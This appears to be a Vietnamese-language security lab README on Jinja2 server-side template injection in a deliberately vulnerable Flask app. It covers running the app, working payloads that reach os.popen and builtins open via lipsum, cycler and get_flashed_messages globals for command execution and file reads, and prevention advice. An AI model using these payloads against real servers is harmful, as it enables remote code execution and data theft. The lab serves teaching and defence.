# Lab 8.1 - SSTI (Server-Side Template Injection) Jinja2

App Flask ca nhan hoa loi chao. Loi: noi input nguoi dung vao chuoi template roi `render_template_string`. Jinja2 danh gia moi bieu thuc `{{ ... }}` trong input, dan toi doc bien, doc file, va RCE.

## Dung

```bash
python3 app.py
# 127.0.0.1:8064
```

Yeu cau: Python 3, Flask.

## Khai thac

```bash
bash exploit.sh
# drvfs bao "Invalid argument": cat exploit.sh | bash
```

Cac buoc:
1. Phat hien: `{{7*7}}` -> `49` (template danh gia phep nhan).
2. Phan biet engine: `{{7*'7'}}` -> `7777777` (Python/Jinja2; Twig se ra `49`).
3. RCE gadget: `{{ lipsum.__globals__['os'].popen('id').read() }}`.
4. RCE gadget khac: `{{ cycler.__init__.__globals__.os.popen('uname -a').read() }}`.
5. Doc file: `{{ get_flashed_messages.__globals__.__builtins__.open('/etc/hostname').read() }}`.

## Ket qua mong doi

Buoc 3, 4 tra ve output lenh that (`uid=...`, `Linux ...`). Buoc 5 doc file. Xem `transcript.txt`.

## Vi sao dinh

`render_template_string(template)` bien chuoi thanh template va danh gia. Vi input nam trong chuoi do, ke tan cong dieu khien duoc ma template. Tu object bat ky trong sandbox Jinja2 co the lan theo `__globals__`/`__class__` toi `os` va `__builtins__`.

## Phong

- Khong bao gio render template tu input. Dung template co san + truyen bien: `render_template_string("Xin chao {{ name }}", name=name)`.
- Neu buoc phai cho template dong: dung engine sandbox that su (vd `SandboxedEnvironment` cua Jinja2) va van han che toi da.
- Loc/escape khong giai quyet goc van de; van de la input bi coi la ma template.
